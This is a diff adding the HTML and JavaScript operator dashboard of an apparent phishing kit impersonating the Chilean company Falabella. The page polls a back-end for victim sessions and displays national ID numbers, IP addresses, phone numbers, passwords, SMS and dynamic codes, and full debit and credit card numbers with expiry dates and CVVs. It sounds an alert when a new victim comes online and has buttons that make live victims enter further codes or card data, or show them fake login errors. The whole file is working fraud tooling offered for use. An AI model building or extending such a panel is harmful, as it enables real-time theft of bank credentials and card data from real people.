@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel de Control - Falabella</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .actions-cell { position: relative; }
+        .actions-cell button { margin-bottom: 6px; transition: opacity 0.2s ease-in-out; }
+        td { vertical-align: middle; white-space: nowrap; }
+        #audio-prompt { position: fixed; top: 0; left: 0; width: 100%; background: rgba(255, 229, 100, 0.95); color: #333; text-align: center; padding: 1rem; font-weight: bold; z-index: 9999; cursor: pointer; }
+        .data-value { font-weight: bold; color: #2563eb; }
+        .action-dropdown { position: absolute; z-index: 50; background-color: white; border: 1px solid #ccc; border-radius: 4px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); padding: 8px; margin-top: 4px; display: flex; flex-direction: column; gap: 5px; min-width: 150px; }
+        .action-dropdown button { text-align: left; padding: 6px 10px; font-size: 0.8rem; background-color: #4A5568; color: white; border: none; border-radius: 3px; width: 100%; margin: 0; cursor: pointer; transition: background-color 0.2s; }
+        .action-dropdown button:hover { background-color: #2D3748; }
+        .action-dropdown button.error-action { background-color: #E53E3E; }
+        .action-dropdown button.error-action:hover { background-color: #C53030; }
+        .visually-blocked { opacity: 0.5 !important; cursor: not-allowed !important; pointer-events: none; }
+
+        @media (max-width: 1024px) {
+            table thead { display: none; }
+            table, table tbody, table tr, table td { display: block; width: 100%; }
+            table tr { margin-bottom: 1.5rem; border: 1px solid #e2e8f0; border-radius: 0.5rem; overflow: hidden; }
+            table td { text-align: right; padding-left: 50%; position: relative; border-bottom: 1px solid #e2e8f0; }
+            table td:last-child { border-bottom: 0; }
+            table td::before { content: attr(data-label); position: absolute; left: 0.75rem; width: 45%; padding-right: 0.75rem; text-align: left; font-weight: bold; white-space: nowrap; }
+            .actions-cell .flex { flex-wrap: wrap; justify-content: flex-end; }
+            .action-dropdown { right: 0; left: auto; }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 p-4 sm:p-8">
+    <div id="audio-prompt">Haz clic aquí para habilitar las notificaciones de sonido.</div>
+
+    <div class="w-full mx-auto bg-white rounded-lg shadow-md p-4 sm:p-6">
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-2xl font-bold text-gray-800">🟢 Panel de Control - Falabella</h1>
+            <button id="clear-db-btn" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-md text-sm">
+                Limpiar DB 🗑️
+            </button>
+        </div>
+
+        <button id="stop-alert-btn" class="hidden mb-4 w-full bg-red-600 text-white font-bold py-2 rounded-md">
+            🚨 SILENCIAR ALERTA 🚨
+        </button>
+
+        <div class="overflow-x-auto">
+            <table class="w-full text-sm text-left text-gray-600">
+                <thead class="text-xs text-white uppercase bg-gray-700">
+                    <tr>
+                        <th class="px-4 py-3">Estado</th>
+                        <th class="px-4 py-3">RUT / IP</th>
+                        <th class="px-4 py-3">Teléfono</th>
+                        <th class="px-4 py-3">Clave</th>
+                        <th class="px-4 py-3">SMS</th>
+                        <th class="px-4 py-3">Dinámica</th>
+                        <th class="px-4 py-3">T. Débito</th>
+                        <th class="px-4 py-3">T. Crédito</th>
+                        <th class="px-4 py-3" style="min-width: 450px;">Acciones</th>
+                    </tr>
+                </thead>
+                <tbody id="user-table-body"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+
+            // Usa el sonido desde /static
+            const notificationSound = new Audio('/static/Sonido.mp3');
+            notificationSound.loop = true;
+
+            const audioPrompt = document.getElementById('audio-prompt');
+            document.body.addEventListener('click', () => {
+                if (audioPrompt) audioPrompt.style.display = 'none';
+            }, { once: true });
+
+            const stopAlertBtn = document.getElementById('stop-alert-btn');
+            stopAlertBtn.addEventListener('click', () => {
+                notificationSound.pause();
+                notificationSound.currentTime = 0;
+                stopAlertBtn.classList.add('hidden');
+            });
+
+            let knownSessionIds = new Set();
+            let isFirstLoad = true;
+            const clearDbBtn = document.getElementById('clear-db-btn');
+            let pollingInterval;
+
+            let dropdownAutoCloseTimeoutId = null;
+            let isDropdownFrozen = false;
+            let dropdownFreezeTimeoutId = null;
+
+            const fetchAndUpdateTable = async () => {
+                try {
+                    // 🔥 IMPORTANTE: aquí llamamos a /api (Flask), no a index.php
+                    const response = await fetch('/api');
+                    if (!response.ok) return;
+
+                    const sessions = await response.json();
+                    const tableBody = document.getElementById('user-table-body');
+                    const currentSessionIds = new Set(sessions.map(s => s.id));
+                    const newSessions = [...currentSessionIds].filter(id => !knownSessionIds.has(id));
+
+                    if (!isFirstLoad && newSessions.length > 0) {
+                        const hasOnlineSession = sessions.some(s => s.connection_status === 'online');
+                        if (hasOnlineSession) {
+                            notificationSound.play().catch(e => console.warn("Audio play failed:", e));
+                            stopAlertBtn.classList.remove('hidden');
+                        }
+                    }
+                    knownSessionIds = currentSessionIds;
+                    isFirstLoad = false;
+                    tableBody.innerHTML = '';
+
+                    if (sessions.length === 0) {
+                        tableBody.innerHTML = `
+                            <tr>
+                                <td colspan="9" class="text-center py-10">
+                                    Esperando solicitudes...
+                                </td>
+                            </tr>`;
+                        return;
+                    }
+
+                    sessions.forEach(data => {
+                        const sessionId = data.id;
+                        const isOnline = data.connection_status === 'online';
+                        const status = isOnline
+                            ? `<span class="px-2 py-1 font-semibold text-green-700 bg-green-100 rounded-full">En Línea</span>`
+                            : `<span class="px-2 py-1 font-semibold text-gray-700 bg-gray-100 rounded-full">Desconectado</span>`;
+
+                        const pending = (data.action_request || '---').replace(/_/g, ' ').toUpperCase();
+                        const isServerWaiting = data.action_request
+                            && data.action_request !== 'login'
+                            && data.action_request !== 'final'
+                            && data.action_request !== 'instruction'
+                            && data.action_request !== null
+                            && data.action_request !== 'ban_redirect';
+
+                        const isRowDisabled = (isServerWaiting || data.action_request === 'final' || data.action_request === 'ban_redirect');
+
+                        const debitCardInfo = data.td
+                            ? `${data.td}<br><span class="text-xs text-gray-500">${data.td_fecha || '--'} / ${data.td_cvv || '--'}</span>`
+                            : '---';
+
+                        const creditCardInfo = data.tc
+                            ? `${data.tc}<br><span class="text-xs text-gray-500">${data.tc_fecha || '--'} / ${data.tc_cvv || '--'}</span>`
+                            : '---';
+
+                        const rutAndIp = `${data.rut || '---'}<br><span class="text-xs text-gray-500 font-bold">${data.ip_address || ''}</span>`;
+                        const telefonoInfo = data.telefono || '---';
+
+                        let buttonsHtml = '';
+
+                        const actionsConfig = [
+                            { action: 'telefono', text: 'Pedir Teléfono', color: 'bg-orange-500', hasDropdown: false },
+                            { action: 'sms1', text: 'SMS', color: 'bg-yellow-500', hasDropdown: true },
+                            { action: 'clave_dinamica', text: 'Dinámica', color: 'bg-sky-500', hasDropdown: true },
+                            { action: 'td', text: 'T. Débito', color: 'bg-indigo-500', hasDropdown: true },
+                            { action: 'tc', text: 'T. Crédito', color: 'bg-pink-500', hasDropdown: true },
+                            { action: 'login_error', text: 'Error Login', color: 'bg-gray-600', hasDropdown: false },
+                            { action: 'final', text: 'Finalizar', color: 'bg-green-600', hasDropdown: false },
+                            { action: 'delete', text: 'Eliminar', color: 'bg-red-600', hasDropdown: false }
+                        ];
+
+                        actionsConfig.forEach(config => {
+                            const dropdownIndicator = config.hasDropdown ? ' ▼' : '';
+                            const buttonClass = `${config.color} text-white px-2 py-1 rounded-md text-xs`;
+                            const dropdownAttr = config.hasDropdown ? 'data-has-dropdown="true"' : '';
+
+                            const isButtonDisabled = (isRowDisabled && config.action !== 'delete' && config.action !== 'final');
+
+                            const disabledAttr = isButtonDisabled ? 'disabled' : '';
+                            const styleAttr = isButtonDisabled ? 'style="opacity: 0.5; cursor: not-allowed;"' : '';
+
+                            buttonsHtml += `
+                                <button data-action="${config.action}"
+                                        class="${buttonClass}"
+                                        ${dropdownAttr} ${disabledAttr} ${styleAttr}>
+                                    ${config.text}${dropdownIndicator}
+                                </button>`;
+                        });
+
+                        tableBody.innerHTML += `
+                            <tr class="bg-white border-b">
+                                <td class="px-4 py-4" data-label="Estado">
+                                    ${status}<br>
+                                    <span class="font-bold text-purple-600">${pending}</span>
+                                </td>
+                                <td class="px-4 py-4" data-label="RUT / IP">
+                                    ${rutAndIp}
+                                </td>
+                                <td class="px-4 py-4 data-value" data-label="Teléfono">
+                                    ${telefonoInfo}
+                                </td>
+                                <td class="px-4 py-4 data-value" data-label="Clave">
+                                    ${data.clave || '--'}
+                                </td>
+                                <td class="px-4 py-4 data-value" data-label="SMS">
+                                    ${data.sms1 || '--'}
+                                </td>
+                                <td class="px-4 py-4 data-value" data-label="Dinámica">
+                                    ${data.clave_dinamica || '--'}
+                                </td>
+                                <td class="px-4 py-4 data-value" data-label="T. Débito">
+                                    ${debitCardInfo}
+                                </td>
+                                <td class="px-4 py-4 data-value" data-label="T. Crédito">
+                                    ${creditCardInfo}
+                                </td>
+                                <td class="px-4 py-4 actions-cell" data-label="Acciones" data-session-id="${data.id}">
+                                    <div class="flex flex-wrap items-center gap-x-2 gap-y-1 relative">
+                                        ${buttonsHtml}
+                                    </div>
+                                </td>
+                            </tr>`;
+                    });
+                } catch (e) {
+                    console.error("Error fetching data:", e);
+                }
+            };
+
+            function showActionDropdown(buttonElement, sessionId, baseAction) {
+                closeDropdown();
+
+                if (pollingInterval) {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                }
+
+                const cell = buttonElement.closest('.actions-cell');
+                if (!cell) return;
+
+                blockOtherButtons(cell, buttonElement);
+
+                const dropdown = document.createElement('div');
+                dropdown.className = 'action-dropdown';
+                dropdown.style.position = 'absolute';
+                dropdown.style.left = `${buttonElement.offsetLeft}px`;
+                dropdown.style.top = `${buttonElement.offsetTop + buttonElement.offsetHeight + 2}px`;
+                dropdown.dataset.sessionId = sessionId;
+
+                let actionText = '', errorAction = `${baseAction}_error`;
+                switch (baseAction) {
+                    case 'sms1':
+                        actionText = 'SMS';
+                        errorAction = 'sms_error';
+                        break;
+                    case 'clave_dinamica':
+                        actionText = 'Dinámica';
+                        errorAction = 'clave_dinamica_error';
+                        break;
+                    case 'td':
+                        actionText = 'T. Débito';
+                        errorAction = 'td_error';
+                        break;
+                    case 'tc':
+                        actionText = 'T. Crédito';
+                        errorAction = 'tc_error';
+                        break;
+                    default:
+                        unblockOtherButtons(cell); return;
+                }
+
+                const actionBtn = document.createElement('button');
+                actionBtn.dataset.action = baseAction;
+                actionBtn.textContent = `Pedir ${actionText}`;
+                dropdown.appendChild(actionBtn);
+
+                const errorBtn = document.createElement('button');
+                errorBtn.dataset.action = errorAction;
+                errorBtn.textContent = `Enviar Error ${actionText}`;
+                errorBtn.classList.add('error-action');
+                dropdown.appendChild(errorBtn);
+
+                cell.appendChild(dropdown);
+
+                isDropdownFrozen = true;
+
+                dropdownFreezeTimeoutId = setTimeout(() => {
+                    isDropdownFrozen = false;
+                    dropdownFreezeTimeoutId = null;
+                    document.addEventListener('click', closeDropdownOnClickOutside, { capture: true, once: true });
+                }, 30000);
+
+                dropdownAutoCloseTimeoutId = setTimeout(() => {
+                    if (document.querySelector('.action-dropdown')) {
+                        closeDropdown();
+                    }
+                }, 30100);
+            }
+
+            function closeDropdown() {
+                if (dropdownFreezeTimeoutId) {
+                    clearTimeout(dropdownFreezeTimeoutId);
+                    dropdownFreezeTimeoutId = null;
+                }
+                if (dropdownAutoCloseTimeoutId) {
+                    clearTimeout(dropdownAutoCloseTimeoutId);
+                    dropdownAutoCloseTimeoutId = null;
+                }
+                isDropdownFrozen = false;
+
+                const existingDropdown = document.querySelector('.action-dropdown');
+                if (existingDropdown) {
+                    const cell = existingDropdown.closest('.actions-cell');
+                    existingDropdown.remove();
+                    if (cell) {
+                        unblockOtherButtons(cell);
+                    }
+                }
+
+                if (!pollingInterval) {
+                    pollingInterval = setInterval(fetchAndUpdateTable, 2500);
+                }
+
+                document.removeEventListener('click', closeDropdownOnClickOutside, { capture: true, once: true });
+            }
+
+            function closeDropdownOnClickOutside(event) {
+                const dropdown = document.querySelector('.action-dropdown');
+                if (!dropdown || dropdown.contains(event.target) || event.target.closest('button[data-has-dropdown="true"]')) {
+                    if (dropdown && (dropdown.contains(event.target) || event.target.closest('button[data-has-dropdown="true"]'))) {
+                        document.addEventListener('click', closeDropdownOnClickOutside, { capture: true, once: true });
+                    }
+                    return;
+                }
+                if (!isDropdownFrozen) {
+                    closeDropdown();
+                } else {
+                    document.addEventListener('click', closeDropdownOnClickOutside, { capture: true, once: true });
+                }
+            }
+
+            function blockOtherButtons(cell, currentButton) {
+                const buttons = cell.querySelectorAll('.flex > button');
+                buttons.forEach(btn => {
+                    if (btn !== currentButton && !btn.disabled && btn.dataset.action !== 'delete' && btn.dataset.action !== 'final') {
+                        btn.classList.add('visually-blocked');
+                    }
+                });
+            }
+
+            function unblockOtherButtons(cell) {
+                const buttons = cell.querySelectorAll('.flex > button');
+                buttons.forEach(btn => { btn.classList.remove('visually-blocked'); });
+            }
+
+            document.body.addEventListener('click', async (e) => {
+                const targetButton = e.target.closest('button');
+                const openDropdown = document.querySelector('.action-dropdown');
+
+                if (openDropdown && isDropdownFrozen) {
+                    if (targetButton && openDropdown.contains(targetButton)) {
+                        const parentTd = targetButton.closest('.actions-cell');
+                        const sessionId = parentTd.dataset.sessionId;
+                        const action = targetButton.dataset.action;
+
+                        closeDropdown();
+                        sendAction(parentTd, sessionId, action);
+                        return;
+                    }
+
+                    e.stopPropagation();
+                    e.preventDefault();
+                    return;
+                }
+
+                if (targetButton && targetButton.id === 'clear-db-btn') {
+                    if (confirm('¿Estás seguro de que deseas limpiar TODA la base de datos? Esta acción no se puede deshacer.')) {
+                        try {
+                            const response = await fetch('/api', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ action: 'clear_db' })
+                            });
+                            const result = await response.json();
+                            if (response.ok) {
+                                alert(result.message || 'Base de datos limpiada.');
+                                fetchAndUpdateTable();
+                            } else {
+                                alert(`Error: ${result.error}`);
+                            }
+                        } catch (err) {
+                            console.error('Error al limpiar DB:', err);
+                            alert('Error de red al limpiar la base de datos.');
+                        }
+                    }
+                    return;
+                }
+
+                if (targetButton && targetButton.id === 'stop-alert-btn') {
+                    notificationSound.pause();
+                    notificationSound.currentTime = 0;
+                    stopAlertBtn.classList.add('hidden');
+                    return;
+                }
+
+                const parentTd = targetButton ? targetButton.closest('.actions-cell') : null;
+                if (parentTd) {
+                    const isInDropdown = targetButton.closest('.action-dropdown');
+                    const sessionId = parentTd.dataset.sessionId;
+                    const action = targetButton.dataset.action;
+
+                    if (targetButton.disabled || targetButton.classList.contains('visually-blocked')) {
+                        const existingDropdown = parentTd.querySelector('.action-dropdown');
+                        if (!existingDropdown || !existingDropdown.previousElementSibling?.isSameNode(targetButton)) {
+                            e.preventDefault();
+                            e.stopPropagation();
+                            return;
+                        }
+                    }
+
+                    if (isInDropdown) {
+                        closeDropdown();
+                        sendAction(parentTd, sessionId, action);
+                    } else {
+                        if (targetButton.dataset.hasDropdown === 'true') {
+                            if (openDropdown) {
+                                if (openDropdown.previousElementSibling?.isSameNode(targetButton)) {
+                                    closeDropdown();
+                                } else {
+                                    showActionDropdown(targetButton, sessionId, action);
+                                }
+                            } else {
+                                showActionDropdown(targetButton, sessionId, action);
+                            }
+                        } else {
+                            closeDropdown();
+                            sendAction(parentTd, sessionId, action);
+                        }
+                    }
+                }
+            });
+
+            async function sendAction(tableCellElement, sessionId, action) {
+                let body = { session_id: sessionId, action: action };
+                const allButtonsInRow = tableCellElement.querySelectorAll('.flex > button');
+
+                allButtonsInRow.forEach(btn => {
+                    if (!btn.disabled && !btn.closest('.action-dropdown') && btn.dataset.action !== 'delete' && btn.dataset.action !== 'final') {
+                        btn.classList.add('visually-blocked');
+                    }
+                });
+
+                if (action === 'td' || action === 'tc') {
+                    const last4 = prompt(`Ingresa los últimos 4 dígitos para ${action === 'td' ? 'T. Débito' : 'T. Crédito'}:`);
+                    if (!last4 || !/^\d{4}$/.test(last4.trim())) {
+                        alert('Entrada inválida.');
+                        allButtonsInRow.forEach(btn => btn.classList.remove('visually-blocked'));
+                        return;
+                    }
+                    body.last4 = last4.trim();
+                }
+
+                try {
+                    const response = await fetch('/api', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(body)
+                    });
+                    const result = await response.json();
+                    if (!response.ok) {
+                        alert(`Error del servidor: ${result.error || 'Desconocido'}`);
+                    }
+                } catch (error) {
+                    console.error("Error sending action:", error);
+                    alert('Error de red al enviar la acción.');
+                } finally {
+                    fetchAndUpdateTable();
+                }
+            }
+
+            pollingInterval = setInterval(fetchAndUpdateTable, 2500);
+            fetchAndUpdateTable();
+        });
+    </script>
+</body>
+</html>
+
